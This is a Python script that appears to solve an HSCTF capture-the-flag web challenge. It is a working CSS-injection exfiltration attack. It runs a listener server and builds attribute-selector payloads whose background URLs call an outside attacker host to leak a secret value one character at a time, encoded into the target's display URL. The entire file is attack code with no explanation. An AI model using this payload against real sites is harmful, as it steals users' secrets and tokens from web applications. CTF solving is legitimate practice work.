import base64
from aiohttp import web
import asyncio
import string
import os
import requests

TARGET = "http://web1.hsctf.com:8002"
URL = "http://markdown-plus-plus-asdof.herokuapp.com"

async def css_injection():
	curr = "{"
	
	resp = asyncio.Queue()
	send_next = asyncio.Event()
	send_next.set()
	
	routes = web.RouteTableDef()
	
	@routes.get("/get/{name}")
	async def get(request):
		print(request.match_info)
		await resp.put(request.match_info["name"])
		return web.Response(body="")
	
	app = web.Application()
	app.add_routes(routes)
	runner = web.AppRunner(app)
	await runner.setup()
	site = web.TCPSite(runner, '0.0.0.0', int(os.getenv('PORT') or 8000))
	await site.start()
	
	try:
		while True:
			css = inject(curr)
			s = "[c=red}%s]" % css
			url = f"{TARGET}/display#{base64.b64encode(s.encode('utf-8')).decode()}"
			print(url)
			# requests.get(url)
			c = await resp.get()
			curr += c
			print(curr)
			send_next.set()
	finally:
		await runner.cleanup()

def inject(prefix):
	css = ""
	for c in string.ascii_lowercase + "{_}":
		css += f"[placeholder*='{prefix+c}']{{background:url(\"{URL}/get/{c}\")}}"
	return css

asyncio.run(css_injection())
